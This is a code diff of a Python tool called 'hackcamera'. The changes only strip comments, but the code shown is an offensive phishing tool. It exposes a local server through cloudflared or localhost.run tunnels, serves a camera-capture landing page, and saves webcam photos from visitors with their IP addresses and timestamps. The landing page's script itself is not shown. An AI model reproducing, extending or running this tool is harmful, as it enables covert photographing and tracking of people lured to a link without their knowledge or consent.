@@ -20,9 +20,7 @@ from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import requests
 
-# ============================================================
-# COLOR SETUP
-# ============================================================
+
 try:
     from colorama import init, Fore, Back, Style
     init(autoreset=True)
@@ -33,16 +31,11 @@ except ImportError:
         def __getattr__(self, name): return ''
     C = S = Dummy()
 
-# ============================================================
-# CONFIGURATION
-# ============================================================
 PORT = 8080
 LOG_DIR = "hackcamera_captures"
 TOOLS_DIR = os.path.join(os.path.expanduser("~"), ".hackcamera")
 
-# ============================================================
-# ASCII ART BANNER
-# ============================================================
+
 BANNER = f"""
 {C.RED}                    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
 {C.RED}                    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
@@ -66,9 +59,7 @@ BANNER = f"""
 
 """
 
-# ============================================================
-# LANDING PAGE - Camera Capture
-# ============================================================
+
 LANDING_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -465,9 +456,6 @@ function showError(msg){
 </body>
 </html>"""
 
-# ============================================================
-# UTILITY FUNCTIONS
-# ============================================================
 def get_local_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -487,9 +475,7 @@ def spinner(text, duration=0.8):
         time.sleep(0.07)
         i += 1
 
-# ============================================================
-# TUNNEL METHODS
-# ============================================================
+
 def install_cloudflared():
     exe_name = "cloudflared.exe" if os.name == "nt" else "cloudflared"
     exe_path = os.path.join(TOOLS_DIR, exe_name)
@@ -618,9 +604,6 @@ def start_localhost_run():
         pass
     return None
 
-# ============================================================
-# HTTP SERVER
-# ============================================================
 class HackCameraHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
@@ -641,20 +624,20 @@ class HackCameraHandler(BaseHTTPRequestHandler):
             timestamp = data.get("timestamp", datetime.now().isoformat())
             ip = self.client_address[0]
 
-            # Save photo
+            
             os.makedirs(LOG_DIR, exist_ok=True)
             photo_count = len([f for f in os.listdir(LOG_DIR) if f.endswith('.jpg')]) + 1
             photo_filename = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{photo_count}.jpg"
             photo_path = os.path.join(LOG_DIR, photo_filename)
 
-            # Remove base64 header
+           
             if "base64," in photo_b64:
                 photo_b64 = photo_b64.split("base64,")[1]
 
             with open(photo_path, "wb") as f:
                 f.write(base64.b64decode(photo_b64))
 
-            # Save metadata
+           
             meta = {
                 "id": datetime.now().strftime("%Y%m%d%H%M%S%f"),
                 "timestamp": timestamp,
@@ -694,14 +677,12 @@ class HackCameraHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({"status": "ok"}).encode())
 
-# ============================================================
-# MAIN
-# ============================================================
+
 def main():
     os.system("cls" if os.name == "nt" else "clear")
     print(BANNER)
 
-    # Startup
+  
     print(f"  {C.CYAN}◆ {S.BRIGHT}INITIALIZATION{S.RESET_ALL}")
     print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
 
@@ -721,7 +702,7 @@ def main():
     print(f"    {C.GREEN}✓{S.RESET_ALL}  Storage: {os.path.abspath(LOG_DIR)}")
     print()
 
-    # Tunnel setup
+  
     print(f"  {C.CYAN}◆ {S.BRIGHT}TUNNEL CONNECTION{S.RESET_ALL}")
     print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
 
@@ -747,7 +728,7 @@ def main():
 
     print()
 
-    # Result
+ 
     print(f"  {C.CYAN}◆ {S.BRIGHT}RESULT{S.RESET_ALL}")
     print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
 
